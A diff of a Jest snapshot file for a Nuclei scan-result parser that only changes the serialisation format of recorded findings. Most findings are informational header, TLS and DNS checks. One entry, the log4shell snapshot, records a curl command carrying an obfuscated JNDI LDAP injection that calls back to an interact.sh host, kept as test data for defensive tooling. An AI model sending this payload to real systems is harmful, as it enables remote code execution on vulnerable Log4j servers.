@@ -1,6 +1,6 @@
 // Jest Snapshot v1, https://goo.gl/fbAQLP
 
-exports[`parses empty result correctly 1`] = `Array []`;
+exports[`parses empty result correctly 1`] = `[]`;
 
 exports[`parses ftp result correctly 1`] = `
 Array [
@@ -52,17 +52,17 @@ Array [
 `;
 
 exports[`parses log4shell result correctly 1`] = `
-Array [
-  Object {
-    "attributes": Object {
-      "author": Array [
+[
+  {
+    "attributes": {
+      "author": [
         "melbadry9",
         "dhiyaneshdk",
         "daffainfo",
         "j12934",
       ],
       "curl_command": "curl -X 'GET' -d '' -H 'Host: 10.1.6.107:8080' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36' -H 'X-Api-Version: \${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://\${hostName}.c70v8s2ukqds73d3ve90c8y9eheyyyyyc.interact.sh}' 'http://10.1.6.107:8080/'",
-      "extracted_results": Array [
+      "extracted_results": [
         "vuln-log4j-vulnerable-log4j-74bbf59745-h2kqj",
       ],
       "hostname": "10.1.6.107",
@@ -73,14 +73,14 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://github.com/advisories/ghsa-jfh8-c2jp-5v3q",
         "https://www.lunasec.io/docs/blog/log4j-zero-day/",
         "https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "cve",
         "cve2021",
         "rce",
@@ -103,14 +103,14 @@ Array [
 `;
 
 exports[`parses results with requests & responses correctly 1`] = `
-Array [
-  Object {
-    "attributes": Object {
-      "author": Array [
+[
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": "curl -X 'OPTIONS' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36' 'https://example.com'",
-      "extracted_results": Array [
+      "extracted_results": [
         "OPTIONS, GET, HEAD, POST",
       ],
       "hostname": "example.com",
@@ -142,7 +142,7 @@ Server: EOS (vny/0454)
 Content-Length: 0
 
 ",
-      "tags": Array [
+      "tags": [
         "misc",
         "generic",
       ],
@@ -162,10 +162,10 @@ Content-Length: 0
 `;
 
 exports[`parses secureCodeBox.io result correctly 1`] = `
-Array [
-  Object {
-    "attributes": Object {
-      "author": Array [
+[
+  {
+    "attributes": {
+      "author": [
         "yavolo",
         "dwisiswant0",
       ],
@@ -179,12 +179,12 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "xss",
         "misc",
       ],
@@ -200,13 +200,13 @@ Array [
     "name": "DOM EventListener detection",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "panch0r3d",
       ],
       "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'https://www.securecodebox.io'",
-      "extracted_results": Array [
+      "extracted_results": [
         "securecodebox@iteratec.com",
       ],
       "hostname": "www.securecodebox.io",
@@ -220,7 +220,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misc",
         "email",
       ],
@@ -236,13 +236,13 @@ Array [
     "name": "Email Extractor",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "dadevel",
       ],
       "curl_command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36' 'https://www.securecodebox.io'",
-      "extracted_results": Array [
+      "extracted_results": [
         "Docusaurus v2.0.1",
       ],
       "hostname": "www.securecodebox.io",
@@ -253,12 +253,12 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://www.w3schools.com/tags/att_meta_name.asp",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "tech",
         "cms",
       ],
@@ -274,9 +274,9 @@ Array [
     "name": "Metatag CMS Detection",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -298,7 +298,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -315,9 +315,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -339,7 +339,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -356,9 +356,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -380,7 +380,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -397,9 +397,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -421,7 +421,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -438,9 +438,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -462,7 +462,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -479,9 +479,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -503,7 +503,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -520,9 +520,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -544,7 +544,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -561,9 +561,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -585,7 +585,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -602,9 +602,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -626,7 +626,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -643,9 +643,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -667,7 +667,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -684,9 +684,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -708,7 +708,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -725,9 +725,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -749,7 +749,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -766,9 +766,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -790,7 +790,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -807,9 +807,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -831,7 +831,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -848,9 +848,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -872,7 +872,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -889,9 +889,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -913,7 +913,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -930,13 +930,13 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "docs-securecodebox.netlify.app.",
       ],
       "hostname": "www.securecodebox.io",
@@ -947,13 +947,13 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://www.theregister.com/2021/02/24/dns_cname_tracking/",
         "https://www.ionos.com/digitalguide/hosting/technical-matters/cname-record/",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "dns",
         "cname",
       ],
@@ -969,13 +969,13 @@ Array [
     "name": "CNAME Fingerprint",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "TLS13",
       ],
       "hostname": "www.securecodebox.io",
@@ -989,7 +989,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/tls-version.yaml",
@@ -1004,13 +1004,13 @@ Array [
     "name": "TLS Version",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "docs.securecodebox.io",
         "www.securecodebox.io",
       ],
@@ -1025,7 +1025,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/ssl-dns-names.yaml",
@@ -1044,10 +1044,10 @@ Array [
 `;
 
 exports[`parses the example.com result correctly 1`] = `
-Array [
-  Object {
-    "attributes": Object {
-      "author": Array [
+[
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1069,7 +1069,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1086,9 +1086,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1110,7 +1110,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1127,9 +1127,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1151,7 +1151,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1168,9 +1168,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1192,7 +1192,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1209,9 +1209,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1233,7 +1233,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1250,9 +1250,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1274,7 +1274,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1291,9 +1291,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1315,7 +1315,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1332,9 +1332,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1356,7 +1356,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1373,9 +1373,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1397,7 +1397,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1414,9 +1414,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1438,7 +1438,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1455,9 +1455,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1479,7 +1479,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1496,9 +1496,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1520,7 +1520,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1537,9 +1537,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1561,7 +1561,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1578,9 +1578,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1602,7 +1602,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1619,9 +1619,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1643,7 +1643,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1660,9 +1660,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1684,7 +1684,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1701,9 +1701,9 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "socketz",
         "geeknik",
         "g4l1t0",
@@ -1725,7 +1725,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misconfig",
         "generic",
       ],
@@ -1742,13 +1742,13 @@ Array [
     "name": "HTTP Missing Security Headers",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "example.net",
         "example.edu",
         "example.com",
@@ -1769,7 +1769,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/ssl-dns-names.yaml",
@@ -1784,13 +1784,13 @@ Array [
     "name": "SSL DNS Names",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": "curl -X 'OPTIONS' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36' 'https://example.com'",
-      "extracted_results": Array [
+      "extracted_results": [
         "OPTIONS, GET, HEAD, POST",
       ],
       "hostname": "example.com",
@@ -1804,7 +1804,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "misc",
         "generic",
       ],
@@ -1820,14 +1820,14 @@ Array [
     "name": "Allowed Options Method",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "righettod",
         "forgedhallpass",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "TLS10",
       ],
       "hostname": "example.com",
@@ -1836,16 +1836,16 @@ Array [
       "matched_line": null,
       "matcher_name": null,
       "matcher_status": true,
-      "metadata": Object {
+      "metadata": {
         "shodan-query": "ssl.version:sslv2 ssl.version:sslv3 ssl.version:tlsv1 ssl.version:tlsv1.1",
       },
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://ssl-config.mozilla.org/#config=intermediate",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/deprecated-tls.yaml",
@@ -1861,14 +1861,14 @@ Array [
     "name": "Deprecated TLS Detection (TLS 1.1 or SSLv3)",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "righettod",
         "forgedhallpass",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "TLS11",
       ],
       "hostname": "example.com",
@@ -1877,16 +1877,16 @@ Array [
       "matched_line": null,
       "matcher_name": null,
       "matcher_status": true,
-      "metadata": Object {
+      "metadata": {
         "shodan-query": "ssl.version:sslv2 ssl.version:sslv3 ssl.version:tlsv1 ssl.version:tlsv1.1",
       },
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://ssl-config.mozilla.org/#config=intermediate",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/deprecated-tls.yaml",
@@ -1902,13 +1902,13 @@ Array [
     "name": "Deprecated TLS Detection (TLS 1.1 or SSLv3)",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "a.iana-servers.net.",
         "b.iana-servers.net.",
       ],
@@ -1923,7 +1923,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "dns",
         "ns",
       ],
@@ -1939,13 +1939,13 @@ Array [
     "name": "NS Record Detection",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "31406 8 1 189968811E6EBA862DD6C209F75623D8D9ED9142",
         "31406 8 2 F78CF3344F72137235098ECBBD08947C2C9001C7F6A085A17F518B5D8F6B916D",
         "31589 8 1 3490A6806D47F17A34C29E2CE80E8A999FFBE4BE",
@@ -1961,13 +1961,13 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en",
         "https://www.cyberciti.biz/faq/unix-linux-test-and-validate-dnssec-using-dig-command-line/",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "dns",
         "dnssec",
       ],
@@ -1983,15 +1983,15 @@ Array [
     "name": "DNSSEC Detection",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
-        "\\"v=spf1 -all\\"",
-        "\\"wgyf8z8cgvm2qmxpnbnldrcltvk4xqfn\\"",
+      "extracted_results": [
+        ""v=spf1 -all"",
+        ""wgyf8z8cgvm2qmxpnbnldrcltvk4xqfn"",
       ],
       "hostname": "example.com",
       "ip": null,
@@ -2001,12 +2001,12 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://www.netspi.com/blog/technical/network-penetration-testing/analyzing-dns-txt-records-to-fingerprint-service-providers/",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "dns",
         "txt",
       ],
@@ -2022,13 +2022,13 @@ Array [
     "name": "DNS TXT Record Detected",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "0 .",
       ],
       "hostname": "example.com",
@@ -2039,13 +2039,13 @@ Array [
       "matcher_status": true,
       "metadata": null,
       "path": null,
-      "reference": Array [
+      "reference": [
         "https://www.cloudflare.com/learning/dns/dns-records/dns-mx-record/",
         "https://mxtoolbox.com/",
       ],
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "dns",
         "mx",
       ],
@@ -2061,13 +2061,13 @@ Array [
     "name": "MX Record Detection",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "pdteam",
       ],
       "curl_command": null,
-      "extracted_results": Array [
+      "extracted_results": [
         "TLS13",
       ],
       "hostname": "example.com",
@@ -2081,7 +2081,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "ssl",
       ],
       "template": "ssl/tls-version.yaml",
@@ -2096,13 +2096,13 @@ Array [
     "name": "TLS Version",
     "severity": "INFORMATIONAL",
   },
-  Object {
-    "attributes": Object {
-      "author": Array [
+  {
+    "attributes": {
+      "author": [
         "v0idc0de",
       ],
       "curl_command": "curl -X 'GET' -d '' -H 'Host: login.microsoftonline.com' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36' 'https://login.microsoftonline.com:443/example.com/v2.0/.well-known/openid-configuration'",
-      "extracted_results": Array [
+      "extracted_results": [
         "c7c08208-4f4d-45f1-83cd-5e2f491ab786",
       ],
       "hostname": "example.com",
@@ -2116,7 +2116,7 @@ Array [
       "reference": null,
       "request": null,
       "response": null,
-      "tags": Array [
+      "tags": [
         "azure",
         "microsoft",
         "cloud",
